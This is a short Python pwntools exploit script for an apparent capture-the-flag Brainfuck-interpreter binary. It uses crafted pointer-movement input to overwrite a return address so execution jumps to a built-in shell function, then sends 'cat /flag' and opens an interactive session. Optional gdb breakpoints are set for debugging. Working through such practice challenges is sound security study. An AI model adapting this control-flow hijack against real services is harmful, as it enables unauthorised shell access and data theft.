#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./bf"

rhp = {'host':"localhost",'port':12300}
context(os='linux',arch='i386')
binf = ELF(FILENAME)

#hard-corded in the binary
progbuf = 0x804a0a0
shell   = 0x8048a6e
ret     = 0x8048a9d
diff    = ret - shell

def exploit(conn):
  ##this is brainfuck?###

  a = 0xcc/4

  #call shell()
  conn.recvuntil(": ")
  conn.sendline(">"*(a)+"-"*(diff-1))
  print(">"*(a)+"-"*(diff-1))

  #get the flag
  conn.sendline("cat /flag")

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
      b *0x804860c
      b *0x80488a7
      b 0x080489cb
      c
    """
    #0x804860c: bf_main
    #0x8048703: 1回目のswitch
    #0x80488a7: 2回目のwhile開始
    #0x80489cb: case 7 printf
    conn = gdb.debug(FILENAME,cmd)
else:
    conn = remote(rhp['host'],rhp['port'])
exploit(conn)
conn.interactive()

